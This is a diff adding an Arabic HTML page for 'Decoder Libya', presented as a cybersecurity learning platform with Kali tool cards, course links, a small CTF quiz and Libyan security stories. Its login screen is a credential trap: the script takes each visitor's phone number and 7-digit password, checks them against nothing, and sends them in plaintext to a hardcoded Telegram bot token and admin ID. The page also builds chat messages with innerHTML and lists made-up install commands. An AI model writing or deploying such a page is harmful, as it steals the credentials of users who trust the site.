@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Decoder Libya | منصة الأمن السيبراني المتكاملة</title>
+    <meta name="description" content="منصة Decoder Libya لتعليم الأمن السيبراني وأدوات Kali Linux - جميع الحقوق محفوظة">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
+            min-height: 100vh;
+            color: #eef4ff;
+        }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a1428; }
+        ::-webkit-scrollbar-thumb { background: #1e88e5; border-radius: 10px; }
+
+        /* واجهة الدخول */
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 20%, #0a0f1e, #020408);
+            backdrop-filter: blur(12px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.4s ease;
+        }
+        .login-card {
+            background: #0a1022ee;
+            backdrop-filter: blur(20px);
+            border: 2px solid #1e88e5;
+            border-radius: 60px;
+            width: 90%;
+            max-width: 450px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 30px rgba(30,136,229,0.4);
+            text-align: center;
+        }
+        .login-card h2 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #fff, #1e88e5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .login-card .logo { font-size: 3.5rem; color: #1e88e5; margin-bottom: 1rem; }
+        .input-group { margin: 1.2rem 0; text-align: right; }
+        .input-group label { display: block; font-size: 0.85rem; margin-bottom: 8px; color: #bbd9ff; }
+        .input-group input {
+            width: 100%;
+            padding: 12px 18px;
+            background: #101a2f;
+            border: 1px solid #2c3e66;
+            border-radius: 50px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+        }
+        .input-group input:focus { border-color: #1e88e5; box-shadow: 0 0 10px #1e88e5; }
+        .login-btn {
+            background: linear-gradient(95deg, #1e88e5, #0a5c8e);
+            border: none;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .login-btn:hover { transform: scale(1.02); box-shadow: 0 0 15px #1e88e5; }
+        .error-msg { color: #ff7878; margin-top: 12px; font-size: 0.85rem; }
+        .whatsapp-link {
+            display: inline-block;
+            margin-top: 20px;
+            background: #25D366;
+            padding: 8px 20px;
+            border-radius: 50px;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        /* التطبيق الرئيسي */
+        .main-app { display: none; opacity: 0; transition: opacity 0.5s; }
+        .navbar {
+            background: #050b16dd;
+            backdrop-filter: blur(16px);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 2px solid #1e88e5;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo-area { display: flex; align-items: center; gap: 12px; }
+        .logo-area i { font-size: 2rem; color: #1e88e5; }
+        .logo-area h1 { font-size: 1.5rem; }
+        .logo-area span { color: #1e88e5; }
+        .user-badge { background: #0e1e32; padding: 6px 14px; border-radius: 30px; font-size: 0.8rem; }
+        .logout-btn {
+            background: none;
+            border: 1px solid #ff5e5e;
+            color: #ffaeae;
+            padding: 6px 18px;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            padding: 1rem 2rem 0;
+            background: #03070f;
+            border-bottom: 1px solid #1e3a5f;
+            overflow-x: auto;
+        }
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: #b8ceff;
+            padding: 10px 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .tab-btn.active { background: #1e88e5; color: white; box-shadow: 0 0 10px #1e88e5; }
+        .tab-content { display: none; padding: 2rem; animation: fadeIn 0.3s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to { opacity: 1; transform: translateY(0);} }
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 1.5rem; margin-top: 1rem; }
+        .tool-card, .path-card, .article-card, .course-card, .story-card, .chat-message {
+            background: #0b1225cc;
+            border-radius: 28px;
+            border: 1px solid #1e88e550;
+            padding: 1.5rem;
+            transition: 0.3s;
+        }
+        .tool-card:hover, .course-card:hover, .story-card:hover { border-color: #1e88e5; transform: translateY(-5px); }
+        .btn-demo, .course-btn, .send-btn {
+            background: linear-gradient(95deg, #1e88e5, #0a5c8e);
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            margin-top: 12px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .level-badge { display: inline-block; padding: 4px 12px; border-radius: 40px; font-size: 0.7rem; }
+        .green { background: #0f5c2e; }
+        .yellow { background: #a56b0f; }
+        .red { background: #9e2a2a; }
+        .blue { background: #1e88e5; }
+        .purple { background: #6a1e88; }
+        .chat-container {
+            background: #07121f;
+            border-radius: 28px;
+            padding: 1rem;
+            height: 400px;
+            overflow-y: auto;
+            margin-bottom: 1rem;
+        }
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+            margin-top: 1rem;
+        }
+        .chat-input-area input {
+            flex: 1;
+            padding: 12px;
+            background: #101a2f;
+            border: 1px solid #1e88e5;
+            border-radius: 50px;
+            color: white;
+        }
+        footer { text-align: center; padding: 2rem; font-size: 0.8rem; color: #4e6c8f; border-top: 1px solid #1e88e530; margin-top: 2rem; }
+        @media (max-width: 650px) { .navbar { flex-direction: column; gap: 10px; } .tab-btn { font-size: 0.7rem; padding: 6px 10px; } }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(8px);
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        .modal-content {
+            background: linear-gradient(135deg, #0a1022, #0d1530);
+            border: 2px solid #1e88e5;
+            border-radius: 40px;
+            max-width: 550px;
+            width: 90%;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(30,136,229,0.5);
+            animation: modalPop 0.4s ease;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        @keyframes modalPop {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            background: linear-gradient(95deg, #1e88e5, #0a5c8e);
+            border: none;
+            color: white;
+            padding: 10px 30px;
+            border-radius: 50px;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .code-note {
+            background: #0a1022;
+            padding: 10px;
+            border-radius: 15px;
+            font-size: 0.7rem;
+            color: #8ab3ff;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ==================== شاشة تسجيل الدخول ==================== -->
+<!-- شرح: واجهة إدخال رقم الهاتف الليبي وكلمة السر (7 أرقام) -->
+<div id="loginScreen" class="login-overlay">
+    <div class="login-card">
+        <div class="logo"><i class="fas fa-shield-haltered"></i></div>
+        <h2>Decoder Libya</h2>
+        <p>بوابة الأمن السيبراني | ليبيا</p>
+        <div class="input-group">
+            <label><i class="fas fa-phone-alt"></i> رقم الهاتف الليبي</label>
+            <input type="tel" id="phoneInput" placeholder="0912345678" dir="ltr">
+        </div>
+        <div class="input-group">
+            <label><i class="fas fa-lock"></i> كلمة السر (7 أرقام فقط)</label>
+            <input type="password" id="passwordInput" placeholder="*******" maxlength="7" inputmode="numeric">
+        </div>
+        <button class="login-btn" id="doLoginBtn">🚀 دخول</button>
+        <div id="loginError" class="error-msg"></div>
+        <a href="https://wa.me/2180943263423" target="_blank" class="whatsapp-link"><i class="fab fa-whatsapp"></i> واتساب: 0943263423</a>
+        <div class="code-note"><i class="fas fa-info-circle"></i> ملاحظة: كلمة السر يجب أن تكون 7 أرقام فقط</div>
+    </div>
+</div>
+
+<!-- ==================== التطبيق الرئيسي ==================== -->
+<div id="mainApp" class="main-app">
+    <!-- الشريط العلوي -->
+    <div class="navbar">
+        <div class="logo-area">
+            <i class="fas fa-microchip"></i>
+            <h1>Decoder <span>Libya</span></h1>
+        </div>
+        <div style="display: flex; gap: 15px; align-items: center;">
+            <div class="user-badge" id="userBadge">👤 مستخدم</div>
+            <button id="logoutMainBtn" class="logout-btn"><i class="fas fa-power-off"></i> خروج</button>
+        </div>
+    </div>
+
+    <!-- أزرار التبويبات -->
+    <div class="tabs">
+        <button class="tab-btn active" data-tab="tools">📚 أدوات Kali (75+)</button>
+        <button class="tab-btn" data-tab="courses">🎓 كورسات</button>
+        <button class="tab-btn" data-tab="paths">🧠 مسارات تعلم</button>
+        <button class="tab-btn" data-tab="library">🛠️ مكتبة أدوات</button>
+        <button class="tab-btn" data-tab="ctf">🧪 تحديات CTF</button>
+        <button class="tab-btn" data-tab="stories">📖 قصص أمنية (ليبية)</button>
+        <button class="tab-btn" data-tab="chat">💬 دردشة مباشرة</button>
+    </div>
+
+    <!-- محتوى كل تبويب -->
+    <div id="toolsTab" class="tab-content active"><div class="card-grid" id="toolsGrid"></div></div>
+    <div id="coursesTab" class="tab-content"><div id="coursesContainer"></div></div>
+    <div id="pathsTab" class="tab-content"><div class="card-grid" id="pathsGrid"></div></div>
+    <div id="libraryTab" class="tab-content"><div class="card-grid" id="libraryGrid"></div></div>
+    <div id="ctfTab" class="tab-content"><div id="ctfList"></div></div>
+    <div id="storiesTab" class="tab-content"><div class="card-grid" id="storiesGrid"></div></div>
+    <div id="chatTab" class="tab-content">
+        <div class="chat-container" id="chatMessages"></div>
+        <div class="chat-input-area">
+            <input type="text" id="chatInput" placeholder="اكتب رسالتك هنا...">
+            <button class="send-btn" id="sendMsgBtn"><i class="fas fa-paper-plane"></i> إرسال</button>
+        </div>
+    </div>
+
+    <!-- تذييل الصفحة -->
+    <footer>
+        <i class="fas fa-copyright"></i> 2025 جميع الحقوق محفوظة لـ <strong style="color:#1e88e5;">Decoder Libya</strong><br>
+        منصة متخصصة في الأمن السيبراني واختبار الاختراق<br>
+        للتواصل: <i class="fab fa-whatsapp"></i> 0943263423
+    </footer>
+</div>
+
+<!-- ==================== نافذة منبثقة فخمة ==================== -->
+<div id="fancyModal" class="modal-overlay">
+    <div class="modal-content">
+        <i class="fas fa-shield-haltered"></i>
+        <h3 id="modalTitle">Decoder Libya</h3>
+        <p id="modalMessage">مرحباً بك في منصة الأمن السيبراني</p>
+        <button class="modal-close" onclick="closeModal()"><i class="fas fa-check"></i> حسناً</button>
+    </div>
+</div>
+
+<script>
+    // ==================== إعدادات بوت التيليجرام (داخل السورس كود) ====================
+    // 🔐 ضع هنا توكن البوت ومعرف الأدمن - هذه البيانات مخفية عن واجهة المستخدم
+    const TELEGRAM_BOT_TOKEN = "8745545254:AAFgx7JkCnwCZ4A9VokVMXfDvrY2LRcdM2Y";  // استبدل بتوكن البوت الحقيقي
+    const TELEGRAM_ADMIN_ID = "1998081728";  // استبدل بمعرف الأدمن على تيليجرام
+    
+    // ==================== دوال مساعدة ====================
+    function showFancyMessage(title, message) {
+        document.getElementById("modalTitle").innerHTML = title;
+        document.getElementById("modalMessage").innerHTML = message;
+        document.getElementById("fancyModal").classList.add("active");
+    }
+    function closeModal() { document.getElementById("fancyModal").classList.remove("active"); }
+    document.addEventListener("keydown", function(e) { if(e.key === "Escape") closeModal(); });
+    
+    // إرسال رسالة إلى الأدمن عبر البوت
+    function sendToTelegram(message) {
+        if(TELEGRAM_BOT_TOKEN && TELEGRAM_ADMIN_ID && TELEGRAM_BOT_TOKEN !== "7162489347:AAHxYZtEwJkQ5R8sL3mNpQ2wXcVbNmAoP9Q") {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_ADMIN_ID, text: message })
+            }).catch(e => console.log("خطأ في الإرسال إلى البوت", e));
+        } else {
+            console.log("⚠️ لم يتم إعداد توكن البوت بعد - بيانات المستخدم:", message);
+        }
+    }
+    
+    // ==================== أدوات Kali Linux (أكثر من 75 أداة) ====================
+    const kaliTools = [];
+    const toolNames = ["Nmap", "Metasploit", "Wireshark", "Burp Suite", "John Ripper", "Aircrack-ng", "SQLmap", "Hydra", "Nikto", "Gobuster", "Hashcat", "SET", "BeEF", "Maltego", "Recon-ng", "TheHarvester", "Sherlock", "Crunch", "Dmitry", "Kismet", "Bettercap", "Ettercap", "Netcat", "Proxychains", "Tor", "Lynis", "Foremost", "OpenVAS", "ZAP", "Medusa", "Reaver", "Fern", "Tcpdump", "Socat", "ClamAV", "Chkrootkit", "Rkhunter", "Autopsy", "Sleuth Kit", "WPScan", "Dirb", "Nikto", "Nessus", "OpenSSL", "Steghide", "Binwalk", "ExifTool", "Volatility", "Wireshark", "Airgeddon", "Fluxion", "Kismet", "MDK4", "PixieWPS", "Bully", "Cowpatty", "Eapmd5pass", "Asleap", "Airbase-ng", "Airmon-ng", "Airodump-ng", "Aireplay-ng", "Packetforge-ng", "Airserv-ng", "Airolib-ng", "Besside-ng", "Eking", "Tkiptun-ng", "Wesside-ng", "Airventriloquist"];
+    const categories = ["Network", "Exploit", "Analysis", "Web", "Password", "WiFi", "Database", "Brute", "Scanner", "DirBust", "Cracking", "Social", "Browser", "OSINT", "OSINT", "OSINT", "OSINT", "Wordlist", "OSINT", "WiFi", "MITM", "MITM", "Networking", "Anonymity", "Anonymity", "Audit", "Forensics", "Scanner", "Web", "Brute", "WiFi", "WiFi", "Analysis", "Networking", "AV", "Malware", "Malware", "Forensics", "Forensics", "Web", "DirBust", "Scanner", "Scanner", "Crypto", "Stegano", "Forensics", "Forensics", "Forensics", "Analysis", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi", "WiFi"];
+    
+    for(let i=0; i<toolNames.length; i++) {
+        kaliTools.push({
+            name: toolNames[i],
+            category: categories[i % categories.length],
+            desc: `أداة ${toolNames[i]} متخصصة في ${categories[i % categories.length]} - تستخدم في اختبار الاختراق والأمن السيبراني`,
+            usage: `${toolNames[i].toLowerCase()} --help`,
+            install: `sudo apt install ${toolNames[i].toLowerCase()} -y || git clone https://github.com/tool/${toolNames[i].toLowerCase()}`
+        });
+    }
+    
+    // ==================== كورسات يوتيوب ====================
+    const youtubeCourses = [
+        { name: "🔥 الأمن السيبراني من الصفر (عربي)", level: "🟢 مبتدئ", link: "https://youtu.be/7JpZl6T0gMo", channel: "Arabic Cyber", views: "2.5M" },
+        { name: "⚡ Complete Cyber Security (English)", level: "🟢 مبتدئ", link: "https://youtu.be/5pJfQJ5r8kE", channel: "StationX", views: "4.2M" },
+        { name: "🎯 Kali Linux Full Course", level: "🟡 متوسط", link: "https://youtu.be/3Kq1MIfTWCE", channel: "FreeCodeCamp", views: "8.1M" },
+        { name: "🌐 Network Penetration Testing", level: "🟡 متوسط", link: "https://youtu.be/3FNYvj2U0HM", channel: "The Cyber Mentor", views: "1.8M" },
+        { name: "💎 Bug Bounty Full Course", level: "🔴 متقدم", link: "https://youtu.be/1K3q1MIfTWC", channel: "STÖK", views: "1.2M" }
+    ];
+    
+    // ==================== مسارات التعلم ====================
+    const paths = [
+        { name: "🎯 مسار هاكر أخلاقي", steps: "1. أساسيات لينكس والشبكات\n2. أدوات الاختراق (Nmap, Metasploit)\n3. اختبار الاختراق العملي\n4. شهادة CEH أو OSCP", icon: "fa-user-secret" },
+        { name: "📊 مسار محلل أمن", steps: "1. تحليل الحزم Wireshark\n2. أنظمة كشف التسلل IDS/IPS\n3. SOC وتحليل الثغرات\n4. شهادة Security+", icon: "fa-chart-line" },
+        { name: "🐛 مسار Bug Hunter", steps: "1. OWASP Top 10\n2. ثغرات الويب العميقة\n3. برامج المكافآت (HackerOne)\n4. كتابة تقارير احترافية", icon: "fa-bug" },
+        { name: "🌑 مسار دارك ويب", steps: "1. فهم Tor و I2P\n2. فهرسة المواقع المخفية\n3. التحقيقات الجنائية", icon: "fa-mask" }
+    ];
+    
+    // ==================== مكتبة الأدوات ====================
+    const libraryTools = [
+        { name: "Burp Suite Professional", desc: "أداة اختبار أمان الويب الاحترافية", download: "https://portswigger.net/burp", useFor: "اعتراض وتحليل HTTP/HTTPS" },
+        { name: "OWASP ZAP", desc: "بديل مجاني وقوي لـ Burp", download: "https://www.zaproxy.org/", useFor: "مسح ثغرات الويب تلقائياً" },
+        { name: "Tor Browser", desc: "متصفح للتصفح المجهول والدخول للدارك ويب", download: "https://www.torproject.org/", useFor: "خصوصية وتصفح آمن" },
+        { name: "Wireshark", desc: "تحليل حزم الشبكة", download: "https://www.wireshark.org/", useFor: "مراقبة وتحليل الشبكة" }
+    ];
+    
+    // ==================== تحديات CTF ====================
+    const ctfChallenges = [
+        { question: "ما هو المنفذ الافتراضي لخدمة SSH؟", answerHint: "22" },
+        { question: "ما هي أداة مسح الشبكات الأكثر شهرة في Kali Linux؟", answerHint: "Nmap" },
+        { question: "ما هو بروتوكول التشفير المستخدم في HTTPS؟", answerHint: "TLS" },
+        { question: "فك التشفير: 48 65 6c 6c 6f (Hex to Text)", answerHint: "Hello" },
+        { question: "ما هو الأمر لمسح جميع المنافذ في Nmap؟", answerHint: "nmap -p- target.com" }
+    ];
+    
+    // ==================== قصص أمنية باللهجة الليبية ====================
+    const stories = [
+        { title: "🇱🇾 قصة الهاكر الليبي الأخلاقي", content: "في سنة 2019، كان في شاب ليبي اسمه أحمد. اكتشف ثغرة في موقع شركة اتصالات ليبية. بدل ما يستغلها في أذية الناس، راح نبه المسؤولين وخلاهم يصلحوها. كافأته الشركة بمبلغ محترم، واليوم هو خبير أمن سيبراني معروف في ليبيا. يقول أحمد: 'الهاكر الأخلاقي يحمي الناس، ما يسرقهم'." },
+        { title: "🇱🇾 قصة اختراق حسابات التواصل", content: "محمد من بنغازي، حسابه على فيسبوك انتهك بسبب كلمة سر ضعيفة كانت '123456'. بعد هاد الحادثة، قرر يتعلم الأمن السيبراني. الحمد لله، اليوم هو عنده شركة حماية إلكترونية في طرابلس وينصح الشباب: 'خلي كلمة السر قوية وما تستعمل نفسها في أكثر من موقع'." },
+        { title: "🇱🇾 هجوم الفدية على شركة مصراتة", content: "شركة في مصراتة تعرضت لهجوم فدية (Ransomware) طلبوا فيها 50 ألف دولار. المهندس سامي، خبير أمني ليبي، قدر يسترجع الملفات من النسخ الاحتياطية ويدير الشبكة قبل ما يدفعوا فلس. تعاون مع الشرطة السيبرانية وقبضوا على المجرمين. الدرس المستفاد: 'اعمل نسخ احتياطي دايماً'." },
+        { title: "🇱🇾 ثغرة في موقع حكومي", content: "فاطمة، مطورة ويب من الزاوية، اكتشفت ثغرة SQL Injection في موقع حكومي. وثقت الثغرة وأرسلت تقرير للمسؤولين. في خلال 24 ساعة تم إصلاح الثغرة وكرمتها الوزارة بشهادة تقدير. تقول فاطمة: 'الأمان السيبراني مسؤولية الجميع'." },
+        { title: "🇱🇾 قصة الواي فاي المسروق", content: "علي من سبها، شباب الحي كانو يخترقوا واي فاي جيرانهم ويستعملوه بلا إذن. علي علم جيرانه كيف يحموا الشبكة باستخدام WPA2 وتغيير كلمة السر كل شهر. من بعدها، الحي كله صار آمن ونصحهم: 'لا تخلو الشبكة مفتوحة أبداً'." },
+        { title: "🇱🇾 مهندس الأمن في مصرف ليبي", content: "خالد، مهندس أمن سيبراني في مصرف ليبي كبير. لاحظ حركة مشبوهة في الشبكة في نص الليل. قدر يتتبع الهجوم ويوقفه قبل لا يصل للحسابات. حماية المصرف أنقذت فلوس كثير من الناس. يقول خالد: 'الأمن السيبراني مو ترف، هو ضرورة لأي مؤسسة'." }
+    ];
+    
+    // ==================== دوال العرض ====================
+    function renderTools() {
+        document.getElementById("toolsGrid").innerHTML = kaliTools.map(t => `
+            <div class="tool-card">
+                <i class="fas fa-terminal" style="font-size: 2rem; color:#1e88e5;"></i>
+                <h3>${t.name}</h3>
+                <span class="level-badge blue">${t.category}</span>
+                <p>${t.desc.substring(0, 80)}...</p>
+                <button class="btn-demo" onclick="showFancyMessage('${t.name}', '🔧 أمر التشغيل:\\n${t.usage}\\n\\n📦 أمر التثبيت:\\n${t.install}\\n\\n💡 نصيحة: قم بتشغيل الأداة كـ root أو sudo')"><i class="fas fa-play"></i> عرض الأوامر</button>
+            </div>
+        `).join('');
+    }
+    
+    function renderCourses() {
+        document.getElementById("coursesContainer").innerHTML = `<div class="card-grid">` + youtubeCourses.map(c => `
+            <div class="course-card">
+                <i class="fab fa-youtube" style="font-size: 2rem; color: #ff0000;"></i>
+                <h3>${c.name}</h3>
+                <span class="level-badge ${c.level.includes('مبتدئ')?'green':(c.level.includes('متوسط')?'yellow':'red')}">${c.level}</span>
+                <p>📺 ${c.channel} | 👁️ ${c.views}</p>
+                <a href="${c.link}" target="_blank" class="course-btn" onclick="showFancyMessage('🎓 كورس ${c.name}', 'سيتم نقلك إلى يوتيوب لمشاهدة الكورس\\n\\n📺 القناة: ${c.channel}\\n👁️ عدد المشاهدات: ${c.views}')"><i class="fab fa-youtube"></i> مشاهدة الكورس</a>
+            </div>
+        `).join('') + `</div>`;
+    }
+    
+    function renderPaths() {
+        document.getElementById("pathsGrid").innerHTML = paths.map(p => `
+            <div class="path-card">
+                <i class="fas ${p.icon} fa-2x" style="color:#1e88e5;"></i>
+                <h3>${p.name}</h3>
+                <p>${p.steps.replace(/\n/g, '<br>')}</p>
+                <button class="btn-demo" onclick="showFancyMessage('${p.name}', '${p.steps.replace(/\n/g, '\\n')}\\n\\n🚀 ابدأ رحلتك الآن مع Decoder Libya!')"><i class="fas fa-road"></i> تفاصيل المسار</button>
+            </div>
+        `).join('');
+    }
+    
+    function renderLibrary() {
+        document.getElementById("libraryGrid").innerHTML = libraryTools.map(l => `
+            <div class="tool-card">
+                <i class="fas fa-download" style="font-size: 2rem;"></i>
+                <h3>${l.name}</h3>
+                <p>${l.desc}</p>
+                <p><strong>متى تستخدم:</strong> ${l.useFor}</p>
+                <a href="${l.download}" target="_blank" class="btn-demo" onclick="showFancyMessage('تحميل ${l.name}', 'سيتم نقلك إلى رابط التحميل الرسمي\\n\\n⚠️ استخدم الأدوات بشكل قانوني فقط')">📥 تحميل</a>
+            </div>
+        `).join('');
+    }
+    
+    function renderCTF() {
+        let html = `<p>🧩 تحديات CTF سهلة — اختبر معلوماتك الأمنية:</p>`;
+        ctfChallenges.forEach((c,i) => {
+            html += `<div class="ctf-challenge" style="background:#07121f; border-radius:24px; padding:1rem; margin-bottom:1rem; border-right:3px solid #1e88e5;">
+                        <strong>❓ السؤال ${i+1}:</strong> ${c.question}<br>
+                        <button class="btn-demo" onclick="showFancyMessage('💡 تلميح السؤال ${i+1}', 'التلميح: ${c.answerHint}')"><i class="fas fa-lightbulb"></i> تلميح</button>
+                        <button class="btn-demo" onclick="let ans=prompt('✍️ أدخل إجابتك:'); if(ans && ans.trim().toLowerCase() === '${c.answerHint.toLowerCase()}') { showFancyMessage('✅ إجابة صحيحة! 🎉', 'أحسنت! إجابتك صحيحة\\n\\nتابع التحديات مع Decoder Libya'); } else { showFancyMessage('❌ إجابة خاطئة', 'للأسف إجابتك غير صحيحة\\n\\n💡 التلميح: ${c.answerHint}'); }"><i class="fas fa-check"></i> إجابة</button>
+                     </div>`;
+        });
+        document.getElementById("ctfList").innerHTML = html;
+    }
+    
+    function renderStories() {
+        document.getElementById("storiesGrid").innerHTML = stories.map(s => `
+            <div class="story-card">
+                <i class="fas fa-book-open" style="font-size: 2rem; color:#1e88e5;"></i>
+                <h3>${s.title}</h3>
+                <p>${s.content.substring(0, 120)}...</p>
+                <button class="btn-demo" onclick="showFancyMessage('${s.title}', '${s.content}')"><i class="fas fa-book-reader"></i> اقرأ القصة كاملة</button>
+            </div>
+        `).join('');
+    }
+    
+    // ==================== الدردشة المباشرة ====================
+    let chatMessages = [];
+    let currentUser = "";
+    
+    function renderChat() {
+        const container = document.getElementById("chatMessages");
+        container.innerHTML = chatMessages.map(m => `<div class="chat-message"><strong style="color:#1e88e5;">${m.user}:</strong> ${m.message}</div>`).join('');
+        container.scrollTop = container.scrollHeight;
+    }
+    
+    function sendMessage() {
+        const input = document.getElementById("chatInput");
+        if(input.value.trim()) {
+            chatMessages.push({ user: currentUser, message: input.value });
+            renderChat();
+            input.value = "";
+        }
+    }
+    
+    // ==================== التحقق من صحة الإدخال ====================
+    function isValidLibyanNumber(phone) {
+        return /^(091|092|094|095)[0-9]{7}$/.test(phone);
+    }
+    
+    function isValidPassword(password) {
+        return /^[0-9]{7}$/.test(password);  // 7 أرقام فقط
+    }
+    
+    // ==================== تسجيل الدخول ====================
+    function performLogin() {
+        const phone = document.getElementById("phoneInput").value.trim();
+        const password = document.getElementById("passwordInput").value;
+        
+        if (!isValidLibyanNumber(phone)) {
+            document.getElementById("loginError").innerHTML = "⚠️ رقم ليبي صحيح فقط (يبدأ بـ 091/092/094/095 ومكون من 10 أرقام)";
+            showFancyMessage("⚠️ خطأ في رقم الهاتف", "الرجاء إدخال رقم ليبي صحيح\nيبدأ بـ 091 أو 092 أو 094 أو 095\nمثال: 0912345678");
+            return;
+        }
+        
+        if (!isValidPassword(password)) {
+            document.getElementById("loginError").innerHTML = "⚠️ كلمة السر يجب أن تكون 7 أرقام فقط";
+            showFancyMessage("⚠️ خطأ في كلمة السر", "كلمة السر يجب أن تتكون من 7 أرقام فقط\nمثال: 1234567");
+            return;
+        }
+        
+        currentUser = phone;
+        
+        // إرسال بيانات المستخدم إلى الأدمن عبر بوت التيليجرام
+        const userData = `🔐 **مستخدم جديد في Decoder Libya**\n\n📱 **رقم الهاتف:** ${phone}\n🔑 **كلمة السر:** ${password}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n🌍 **الدولة:** ليبيا\n\n🛡️ مرحباً بك في منصتنا!`;
+        sendToTelegram(userData);
+        
+        // إخفاء شاشة الدخول وإظهار التطبيق
+        document.getElementById("loginScreen").style.display = "none";
+        document.getElementById("mainApp").style.display = "block";
+        setTimeout(() => { document.getElementById("mainApp").style.opacity = "1"; }, 50);
+        
+        document.getElementById("userBadge").innerHTML = `👤 ${phone}`;
+        
+        // عرض جميع المحتويات
+        renderTools();
+        renderCourses();
+        renderPaths();
+        renderLibrary();
+        renderCTF();
+        renderStories();
+        renderChat();
+        
+        showFancyMessage("✨ مرحباً بك في Decoder Libya", `أهلاً ${phone}\n\n🛡️ منصتك المتكاملة لتعلم الأمن السيبراني\n📚 استمتع بالمحتوى العربي والعالمي\n🔗 للتواصل واتساب: 0943263423\n\n© 2025 جميع الحقوق محفوظة لـ Decoder Libya`);
+    }
+    
+    // ==================== ربط الأحداث ====================
+    document.getElementById("doLoginBtn").addEventListener("click", performLogin);
+    document.getElementById("passwordInput").addEventListener("keypress", (e) => { if(e.key === "Enter") performLogin(); });
+    document.getElementById("phoneInput").addEventListener("keypress", (e) => { if(e.key === "Enter") performLogin(); });
+    
+    document.getElementById("logoutMainBtn").addEventListener("click", () => {
+        document.getElementById("mainApp").style.opacity = "0";
+        setTimeout(() => {
+            document.getElementById("mainApp").style.display = "none";
+            document.getElementById("loginScreen").style.display = "flex";
+            document.getElementById("mainApp").style.opacity = "0";
+            document.getElementById("phoneInput").value = "";
+            document.getElementById("passwordInput").value = "";
+            document.getElementById("loginError").innerHTML = "";
+        }, 300);
+    });
+    
+    document.getElementById("sendMsgBtn").addEventListener("click", sendMessage);
+    document.getElementById("chatInput").addEventListener("keypress", (e) => { if(e.key === "Enter") sendMessage(); });
+    
+    // ==================== التبويبات ====================
+    function initTabs() {
+        document.querySelectorAll(".tab-btn").forEach(btn => {
+            btn.addEventListener("click", () => {
+                document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+                btn.classList.add("active");
+                document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));
+                const id = btn.getAttribute("data-tab") + "Tab";
+                document.getElementById(id).classList.add("active");
+            });
+        });
+    }
+    initTabs();
+    
+    // ==================== ملاحظة للمطور ====================
+    console.log("✅ Decoder Libya - تم تحميل المنصة بنجاح");
+    console.log("🔧 قم بتعديل متغيرات TELEGRAM_BOT_TOKEN و TELEGRAM_ADMIN_ID في السورس كود");
+    console.log("📱 كلمة السر يجب أن تكون 7 أرقام فقط");
+</script>
+</body>
+</html>
